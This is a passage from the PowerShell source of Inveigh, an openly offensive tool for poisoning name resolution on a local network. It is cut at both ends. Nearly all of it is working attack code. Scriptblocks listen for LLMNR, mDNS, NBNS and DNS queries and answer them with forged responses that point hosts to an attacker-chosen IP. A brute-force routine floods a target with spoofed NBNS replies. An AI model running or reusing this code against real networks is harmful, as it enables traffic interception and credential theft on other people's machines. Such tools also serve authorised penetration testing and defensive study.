                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                        $LLMNR_response_data
                
                            $LLMNR_query_string = [System.Text.Encoding]::UTF8.GetString($payload_bytes[13..($payload_bytes.Length - 4)]) -replace "`0",""

                            if(!$inveigh.request_table.ContainsKey($LLMNR_query_string))
                            {
                                $inveigh.request_table.Add($LLMNR_query_string.ToLower(),[Array]$source_IP.IPAddressToString)
                                $inveigh.request_table_updated = $true
                            }
                            else
                            {
                                $inveigh.request_table.$LLMNR_query_string += $source_IP.IPAddressToString
                                $inveigh.request_table_updated = $true
                            }

                            $LLMNR_request_ignore = $false
                
                            if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $LLMNR_query_string -and $source_IP -ne $IP)
                            {

                                if(($LLMNR_learning_log.Exists({param($s) $s -like "20* $LLMNR_query_string"})))
                                {
                                    $LLMNR_learning_queue_time = [DateTime]$LLMNR_learning_log.Find({param($s) $s -like "20* $LLMNR_query_string"}).SubString(0,19)

                                    if((Get-Date) -ge $LLMNR_learning_queue_time.AddMinutes($SpooferLearningInterval))
                                    {
                                        $LLMNR_learning_log.RemoveAt($LLMNR_learning_log.FindIndex({param($s) $s -like "20* $LLMNR_query_string"}))
                                        $LLMNR_learning_send = $true
                                    }
                                    else
                                    {
                                        $LLMNR_learning_send = $false
                                    }

                                }
                                else
                                {           
                                    $LLMNR_learning_send = $true
                                }
                                
                                if($LLMNR_learning_send)
                                {
                                    $LLMNR_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
                                    $LLMNR_transaction_ID_bytes = $LLMNR_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $LLMNR_transaction_ID = $LLMNR_transaction_ID -replace " ","-"
                                    $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient
                                    $LLMNR_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]

                                    $LLMNR_request_packet = $LLMNR_transaction_ID_bytes +
                                                            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                            ($LLMNR_hostname_bytes.Length - 1) +
                                                            $LLMNR_hostname_bytes +
                                                            0x00,0x01,0x00,0x01

                                    $LLMNR_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
                                    $LLMNR_UDP_client.Connect($LLMNR_learning_destination_endpoint)
                                    $LLMNR_UDP_client.Send($LLMNR_request_packet,$LLMNR_request_packet.Length)
                                    $LLMNR_UDP_client.Close()
                                    $LLMNR_learning_log.Add("$(Get-Date -format s) $LLMNR_transaction_ID $LLMNR_query_string") > $null
                                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request $LLMNR_query_string sent to 224.0.0.252") > $null
                                }

                            }

                            $LLMNR_response_message = Get-SpooferResponseMessage -QueryString $LLMNR_query_string -Type "LLMNR" -Enabled $LLMNR
                            $LLMNR_response_type = $LLMNR_response_message[0]
                            $LLMNR_response_message = $LLMNR_response_message[1]

                            if($LLMNR_response_message -eq '[response sent]')
                            {

                                if($SpooferLearning -eq 'N' -or !$LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                {
                                    $LLMNR_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                    $LLMNR_send_socket.SendBufferSize = 1024
                                    $LLMNR_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
                                    $LLMNR_send_socket.SendTo($LLMNR_response_packet,$LLMNR_destination_point) > $null
                                    $LLMNR_send_socket.Close()
                                }
                                else
                                {
                                    $LLMNR_request_ignore = $true
                                }

                            }
                           
                            if(!$LLMNR_request_ignore)
                            {
                                $inveigh.output_queue.Add("$LLMNR_response_type [$(Get-Date -format s)] LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message") > $null
                            }

                        }

                    }

                }

                switch($endpoint_source_port)
                {

                    5355 # LLMNR Response
                    {
                    
                        if($SpooferLearning -eq 'Y' -and $LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                        {
                            $LLMNR_query_string = [System.Text.Encoding]::UTF8.GetString($payload_bytes[13..($payload_bytes.Length - 4)]) -replace "`0",""
                            [Byte[]]$LLMNR_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]
                            $LLMNR_response_IP = [System.Net.IPAddress]$LLMNR_response_IP_bytes
                            $LLMNR_response_IP = $LLMNR_response_IP.IPAddressToString
                            
                            if($inveigh.valid_host_list -notcontains $LLMNR_query_string)
                            {
                                $inveigh.valid_host_list.Add($LLMNR_query_string) > $null
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $LLMNR_query_string LLMNR response $LLMNR_response_IP received from $source_IP [added to valid host list]") > $null
                            }
                            
                        }

                    }

                }

                if($Pcap -and ($PcapUDP -contains $endpoint_source_port -or $PcapUDP -contains $destination_port -or $PcapUDP -contains 'All'))
                {

                    if($payload_bytes)
                    {
                        $pcap_epoch_time = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
                        $pcap_length = [System.BitConverter]::GetBytes($packet_length + 14)
                        
                        $pcap_packet = [System.BitConverter]::GetBytes([Int][Math]::Truncate($pcap_epoch_time.TotalSeconds)) + 
                            [System.BitConverter]::GetBytes($pcap_epoch_time.Milliseconds) + # should be microseconds but probably doesn't matter
                            $pcap_length +
                            $pcap_length +
                            (,0x00 * 12) +
                            0x08,0x00 +
                            $byte_data[0..($packet_length - 1)]

                        switch ($Pcap)
                        {

                            'File'
                            {

                                try
                                {
                                    $pcap_file.Write($pcap_packet,0,$pcap_packet.Count)    
                                }
                                catch
                                {
                                    $error_message = $_.Exception.Message
                                    $error_message = $error_message -replace "`n",""
                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                                }
                        
                            }

                            'Memory'
                            {
                                $inveigh.pcap.AddRange($pcap_packet) 
                            }

                        }

                    }

                }

            }

        }

    }

    $binary_reader.Close()
    $memory_stream.Dispose()
    $memory_stream.Close()
    $pcap_file.Close()
}

# Unprivileged DNS Spoofer ScriptBlock 
$DNS_spoofer_scriptblock = 
{
    param ($Inspect,$DNSTTL,$SpooferIP)

    $DNS_running = $true
    $DNS_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,53)

    try
    {
        $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53
    }
    catch
    {
        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting DNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $DNS_running = $false
    }

    $DNS_UDP_client.Client.ReceiveTimeout = 5000
    $DNS_TTL_bytes = [System.BitConverter]::GetBytes($DNSTTL)
    [Array]::Reverse($DNS_TTL_bytes)

    while($inveigh.running -and $DNS_running)
    {   

        try
        {
            $DNS_request_data = $DNS_UDP_client.Receive([Ref]$DNS_listener_endpoint)
        }
        catch
        {
            $DNS_UDP_client.Close()
            $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53
            $DNS_UDP_client.Client.ReceiveTimeout = 5000
        }
        
        if($DNS_request_data -and [System.BitConverter]::ToString($DNS_request_data[10..11]) -ne '00-01')
        {
            $DNS_query_string = Get-NameQueryString 12 $DNS_request_data
            $DNS_response_data = $DNS_request_data[12..($DNS_query_string.Length + 13)]
            $DNS_response_type = "[+]"

            $DNS_response_packet = $DNS_request_data[0,1] +
                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $DNS_response_data +
                                    0x00,0x01,0x00,0x01 +
                                    $DNS_response_data +
                                    0x00,0x01,0x00,0x01 +
                                    $DNS_TTL_bytes +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

            $source_IP = $DNS_listener_endpoint.Address
            $DNS_response_message = Get-SpooferResponseMessage -QueryString $DNS_query_string -Type "DNS" -Enabled $DNS
            $DNS_response_type = $DNS_response_message[0]
            $DNS_response_message = $DNS_response_message[1]

            if($DNS_response_message -eq '[response sent]')
            {
                $DNS_destination_endpoint = New-Object System.Net.IPEndpoint($DNS_listener_endpoint.Address,$DNS_listener_endpoint.Port)
                $DNS_UDP_client.Connect($DNS_destination_endpoint)
                $DNS_UDP_client.Send($DNS_response_packet,$DNS_response_packet.Length)
                $DNS_UDP_client.Close()
                $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53
                $DNS_UDP_client.Client.ReceiveTimeout = 5000
            }
           
            $inveigh.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message") > $null
            $DNS_request_data = $null
        }
        
    }

    $DNS_UDP_client.Close()
}

# Unprivileged LLMNR Spoofer ScriptBlock 
$LLMNR_spoofer_scriptblock = 
{
    param ($Inspect,$LLMNRTTL,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$SpooferNonprintable)

    $LLMNR_running = $true
    $LLMNR_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)

    try
    {
        $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient
        $LLMNR_UDP_client.ExclusiveAddressUse = $false
        $LLMNR_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
        $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)
    }
    catch
    {
        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting LLMNR spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $LLMNR_running = $false
    }

    $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
    $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
    $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
    $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
    [Array]::Reverse($LLMNR_TTL_bytes)

    while($inveigh.running -and $LLMNR_running)
    {   

        try
        {
            $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint)
        }
        catch
        {      
            $LLMNR_UDP_client.Close()
            $LLMNR_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)
            $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient
            $LLMNR_UDP_client.ExclusiveAddressUse = $false
            $LLMNR_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
            $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)
            $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
            $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
            $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
        }

        if($LLMNR_request_data -and [System.BitConverter]::ToString($LLMNR_request_data[($LLMNR_request_data.Length - 4)..($LLMNR_request_data.Length - 3)]) -ne '00-1c') # ignore AAAA for now
        {

            $LLMNR_response_packet = $LLMNR_request_data[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                     $LLMNR_request_data[12..$LLMNR_request_data.Length] +
                                     $LLMNR_request_data[12..$LLMNR_request_data.Length] +
                                     $LLMNR_TTL_bytes +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
        
            $LLMNR_query_string = [Text.Encoding]::UTF8.GetString($LLMNR_request_data[13..($LLMNR_request_data[12] + 12)])     
            $source_IP = $LLMNR_listener_endpoint.Address
            $LLMNR_response_type = "[+]"

            if(!$inveigh.request_table.ContainsKey($LLMNR_query_string))
            {
                $inveigh.request_table.Add($LLMNR_query_string.ToLower(),[Array]$source_IP.IPAddressToString)
                $inveigh.request_table_updated = $true
            }
            else
            {
                $inveigh.request_table.$LLMNR_query_string += $source_IP.IPAddressToString
                $inveigh.request_table_updated = $true
            }

            $LLMNR_response_message = Get-SpooferResponseMessage -QueryString $LLMNR_query_string -Type "LLMNR" -Enabled $LLMNR
            $LLMNR_response_type = $LLMNR_response_message[0]
            $LLMNR_response_message = $LLMNR_response_message[1]

            if($LLMNR_response_message -eq '[response sent]')
            {
                $LLMNR_destination_endpoint = New-Object Net.IPEndpoint($LLMNR_listener_endpoint.Address,$LLMNR_listener_endpoint.Port)
                $LLMNR_UDP_client.Connect($LLMNR_destination_endpoint)
                $LLMNR_UDP_client.Send($LLMNR_response_packet,$LLMNR_response_packet.Length)
                $LLMNR_UDP_client.Close()
                $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient
                $LLMNR_UDP_client.ExclusiveAddressUse = $false
                $LLMNR_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
                $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)
                $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
                $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
                $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
            }
        
            if($LLMNR_request_data)
            {
                $inveigh.output_queue.Add("$LLMNR_response_type [$(Get-Date -format s)] LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message") > $null
            }

            $LLMNR_request_data = $null
        }

    }

    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] leaving") > $null
    $LLMNR_UDP_client.Close()
 }

# Unprivileged mDNS Spoofer ScriptBlock 
$mDNS_spoofer_scriptblock = 
{
    param ($Inspect,$mDNSTTL,$mDNSTypes,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore)

    $mDNS_running = $true
    $mDNS_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,5353)

    try
    {
        $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient
        $mDNS_UDP_client.ExclusiveAddressUse = $false
        $mDNS_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
        $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)

    }
    catch
    {
        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting mDNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $mDNS_running = $false
    }

    $mDNS_multicast_group = [IPAddress]"224.0.0.251"
    $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
    $mDNS_UDP_client.Client.ReceiveTimeout = 5000
    $mDNS_TTL_bytes = [System.BitConverter]::GetBytes($mDNSTTL)
    [Array]::Reverse($mDNS_TTL_bytes)

    while($inveigh.running -and $mDNS_running)
    {   

        try
        {
            $mDNS_request_data = $mDNS_UDP_client.Receive([Ref]$mDNS_listener_endpoint)
        }
        catch
        {
            $mDNS_UDP_client.Close()
            $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient
            $mDNS_UDP_client.ExclusiveAddressUse = $false
            $mDNS_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
            $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)
            $mDNS_multicast_group = [IPAddress]"224.0.0.251"
            $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
            $mDNS_UDP_client.Client.ReceiveTimeout = 5000
        }

        if(([System.BitConverter]::ToString($mDNS_request_data)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($mDNS_request_data[4..11]) -eq "00-01-00-00-00-00-00-00")
        {
            $source_IP = $mDNS_listener_endpoint.Address
            $mDNS_query_string_full = Get-NameQueryString 12 $mDNS_request_data
            $mDNS_query_string = ($mDNS_query_string_full.Split("."))[0]
            $mDNS_response_type = "[+]"

            $mDNS_response_packet = $mDNS_request_data[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $mDNS_request_data[12..($mDNS_query_string_full.Length + 13)] +
                                    0x00,0x01,0x00,0x01 +
                                    $mDNS_TTL_bytes +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
            
            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QU" -Enabled $mDNS
            $mDNS_response_type = $mDNS_response_message[0]
            $mDNS_response_message = $mDNS_response_message[1]

            if($mDNS_response_message -eq '[response sent]')
            {
                $mDNS_destination_endpoint = New-Object Net.IPEndpoint($mDNS_listener_endpoint.Address,$mDNS_listener_endpoint.Port)
                $mDNS_UDP_client.Connect($mDNS_destination_endpoint)
                $mDNS_UDP_client.Send($mDNS_response_packet,$mDNS_response_packet.Length)
                $mDNS_UDP_client.Close()
                $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient
                $mDNS_UDP_client.ExclusiveAddressUse = $false
                $mDNS_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
                $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)
                $mDNS_multicast_group = [IPAddress]"224.0.0.251"
                $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
                $mDNS_UDP_client.Client.ReceiveTimeout = 5000
            }
        
            if($mDNS_request_data)
            {
                $inveigh.output_queue.Add("$mDNS_response_type [$(Get-Date -format s)] mDNS(QU) request $mDNS_query_string_full received from $source_IP $mDNS_response_message") > $null
            }

            $mDNS_request_data = $null
        }
        elseif(([System.BitConverter]::ToString($mDNS_request_data)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
            $mDNS_request_data[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($mDNS_request_data[4..11]) -eq "00-02-00-00-00-00-00-00"))
        {
            $source_IP = $mDNS_listener_endpoint.Address
            $mDNS_query_string_full = Get-NameQueryString 12 $mDNS_request_data
            $mDNS_query_string = ($mDNS_query_string_full.Split("."))[0]
            $mDNS_response_type = "[+]"

            $mDNS_response_packet = $mDNS_request_data[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $mDNS_request_data[12..($mDNS_query_string_full.Length + 13)] +
                                    0x00,0x01,0x00,0x01 +
                                    $mDNS_TTL_bytes +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()        
                
            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QM" -Enabled $mDNS
            $mDNS_response_type = $mDNS_response_message[0]
            $mDNS_response_message = $mDNS_response_message[1]

            if($mDNS_response_message -eq '[response sent]')
            {
                $mDNS_destination_endpoint = New-Object Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                $mDNS_UDP_client.Connect($mDNS_destination_endpoint)
                $mDNS_UDP_client.Send($mDNS_response_packet,$mDNS_response_packet.Length)
                $mDNS_UDP_client.Close()
                $mDNS_UDP_client = new-Object System.Net.Sockets.UdpClient 5353
                $mDNS_multicast_group = [IPAddress]"224.0.0.251"
                $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
                $mDNS_UDP_client.Client.ReceiveTimeout = 5000
            }

            if($mDNS_request_data)                   
            {
                $inveigh.output_queue.Add("$mDNS_response_type [$(Get-Date -format s)] mDNS(QM) request $mDNS_query_string_full received from $source_IP $mDNS_response_message") > $null
            }

            $mDNS_request_data = $null
        }

    }

    $mDNS_UDP_client.Close()
}

# Unprivileged NBNS Spoofer ScriptBlock
$NBNS_spoofer_scriptblock = 
{
    param ($Inspect,$IP,$NBNSTTL,$NBNSTypes,$SpooferIP,$SpooferHostsIgnore,$SpooferHostsReply,
        $SpooferIPsIgnore,$SpooferIPsReply,$SpooferNonprintable)

    $NBNS_running = $true
    $NBNS_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)

    try
    {
        $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
    }
    catch
    {
        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting NBNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $NBNS_running = $false
    }

    $NBNS_UDP_client.Client.ReceiveTimeout = 5000
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)

    while($inveigh.running -and $NBNS_running)
    {
        
        try
        {
            $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint)
        }
        catch
        {
            $NBNS_UDP_client.Close()
            $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
            $NBNS_UDP_client.Client.ReceiveTimeout = 5000
        }

        if($NBNS_request_data -and [System.BitConverter]::ToString($NBNS_request_data[10..11]) -ne '00-01')
        {
            $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
            [Array]::Reverse($NBNS_TTL_bytes)

            $NBNS_response_packet = $NBNS_request_data[0,1] +
                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                    $NBNS_request_data[13..$NBNS_request_data.Length] +
                                    $NBNS_TTL_bytes +
                                    0x00,0x06,0x00,0x00 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                                    0x00,0x00,0x00,0x00

            $source_IP = $NBNS_listener_endpoint.Address
            $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])
            $NBNS_query_type = Get-NBNSQueryType $NBNS_query_type
            $NBNS_type = $NBNS_request_data[47]
            $NBNS_response_type = "[+]"
            $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])
            $NBNS_query = $NBNS_query -replace "-00",""
            $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
            $NBNS_query_string_encoded_check = $NBNS_query_string_encoded
            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
            $NBNS_query_string_subtracted = $null
            $NBNS_query_string = $null
            $n = 0
                            
            do
            {
                $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
                $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
                $n += 1
            }
            until($n -ge ($NBNS_query_string_encoded.Length))
                    
            $n = 0
                    
            do
            {
                $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
                $n += 2
            }
            until($n -ge ($NBNS_query_string_subtracted.Length) -or $NBNS_query_string.Length -eq 15)

            if($NBNS_query_string_encoded_check.StartsWith("ABAC") -and $NBNS_query_string_encoded_check.EndsWith("ACAB"))
            {
                $NBNS_query_string = $NBNS_query_string.Substring(2)
                $NBNS_query_string = $NBNS_query_string.Substring(0, $NBNS_query_string.Length - 1)
                $NBNS_query_string = "<01><02>" + $NBNS_query_string + "<02>"
            }

            if($NBNS_query_string -notmatch '[^\x00-\x7F]+')
            {

                if(!$inveigh.request_table.ContainsKey($NBNS_query_string))
                {
                    $inveigh.request_table.Add($NBNS_query_string.ToLower(),[Array]$source_IP.IPAddressToString)
                    $inveigh.request_table_updated = $true
                }
                else
                {
                    $inveigh.request_table.$NBNS_query_string += $source_IP.IPAddressToString
                    $inveigh.request_table_updated = $true
                }

            }
            
            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS" -Enabled $NBNS -NBNSType $NBNS_type
            $NBNS_response_type = $NBNS_response_message[0]
            $NBNS_response_message = $NBNS_response_message[1]

            if($NBNS_response_message -eq '[response sent]')
            {
                $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,$NBNS_listener_endpoint.Port)
                $NBNS_UDP_client.Connect($NBNS_destination_endpoint)
                $NBNS_UDP_client.Send($NBNS_response_packet,$NBNS_response_packet.Length)
                $NBNS_UDP_client.Close()
                $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
                $NBNS_UDP_client.Client.ReceiveTimeout = 5000
            }

            if($NBNS_request_data)                   
            {
                $inveigh.output_queue.Add("$NBNS_response_type [$(Get-Date -format s)] NBNS request $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message") > $null    
            }

            $NBNS_request_data = $null
        }

    }

    $NBNS_UDP_client.Close()
 }

# NBNS BruteForce ScriptBlock
$NBNS_bruteforce_spoofer_scriptblock = 
{
    param ($NBNSBruteForceHost,$NBNSBruteForcePause,$NBNSBruteForceTarget,$NBNSTTL,$SpooferIP)
   
    $NBNSBruteForceHost = $NBNSBruteForceHost.ToUpper()

    $hostname_bytes = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($NBNSBruteForceHost)
    $hostname_encoded = [System.BitConverter]::ToString($hostname_encoded)
    $hostname_encoded = $hostname_encoded.Replace("-","")
    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($hostname_encoded)
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)

    for($i=0; $i -lt $hostname_encoded.Count; $i++)
    {

        if($hostname_encoded[$i] -gt 64)
        {
            $hostname_bytes[$i] = $hostname_encoded[$i] + 10
        }
        else
        {
            $hostname_bytes[$i] = $hostname_encoded[$i] + 17
        }
    
    }

    $NBNS_response_packet = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            $hostname_bytes +
                            0x00,0x20,0x00,0x01 +
                            $NBNS_TTL_bytes +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00

    $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget") > $null
    $NBNS_paused = $false          
    $NBNS_bruteforce_UDP_client = New-Object System.Net.Sockets.UdpClient(137)
    $destination_IP = [System.Net.IPAddress]::Parse($NBNSBruteForceTarget)
    $destination_point = New-Object Net.IPEndpoint($destination_IP,137)
    $NBNS_bruteforce_UDP_client.Connect($destination_point)
       
    while($inveigh.running)
    {

        :NBNS_spoofer_loop while (!$inveigh.hostname_spoof -and $inveigh.running)
        {

            if($NBNS_paused)
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer") > $null
                $NBNS_paused = $false
            }

            for ($i = 0; $i -lt 255; $i++)
            {

                for ($j = 0; $j -lt 255; $j++)
                {
                    $NBNS_response_packet[0] = $i
                    $NBNS_response_packet[1] = $j                 
                    $NBNS_bruteforce_UDP_client.send($NBNS_response_packet,$NBNS_response_packet.Length)

                    if($inveigh.hostname_spoof -and $NBNSBruteForcePause)
                    {
                        $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer") > $null
                        $NBNS_paused = $true
                        break NBNS_spoofer_loop
                    }
                
                }
            
            }
        
        }

        Start-Sleep -m 5
    }

    $NBNS_bruteforce_UDP_client.Close()
}

# Control Loop ScriptBlock
$control_scriptblock =
{
    param ($ADIDNSACE,$ADIDNSCleanup,[System.Management.Automation.PSCredential]$ADIDNSCredential,$ADIDNSDomain,
        $ADIDNSDomainController,$ADIDNSForest,$ADIDNSHostsIgnore,$ADIDNSNS,$ADIDNSNSTarget,$ADIDNSPartition,
        $ADIDNSThreshold,$ADIDNSTTL,$ADIDNSZone,$ConsoleQueueLimit,$elevated_privilege,$NBNSBruteForcePause,
        $RunCount,$RunTime,$SpooferIP)

    function Invoke-OutputQueueLoop
    {

        while($inveigh.output_queue.Count -gt 0)
        {
            $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null

            if($inveigh.file_output)
            {
                
                if ($inveigh.output_queue[0].StartsWith("[+] ") -or $inveigh.output_queue[0].StartsWith("[*] ") -or $inveigh.output_queue[0].StartsWith("[!] ") -or $inveigh.output_queue[0].StartsWith("[-] "))
                {
                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
                }
                else
                {
                    $inveigh.log_file_queue.Add("[redacted]") > $null    
                }

            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

    }

    function Stop-InveighRunspace
    {
        param ([String]$Message)
        
        if($inveigh.HTTPS -and !$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))
        {

            try
            {
